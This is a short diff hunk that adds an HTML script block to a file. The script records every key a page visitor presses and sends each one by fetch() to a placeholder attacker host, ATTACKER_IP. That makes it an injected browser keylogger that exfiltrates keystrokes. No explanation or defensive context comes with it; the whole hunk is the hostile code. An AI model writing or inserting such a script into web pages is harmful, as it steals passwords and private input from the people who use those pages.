@@ -1,0 +1,5 @@
+<script>
+document.addEventListener('keydown', e => {
+  fetch('ATTACKER_IP/?key=' + encodeURIComponent(e.key));
+});
+</script>
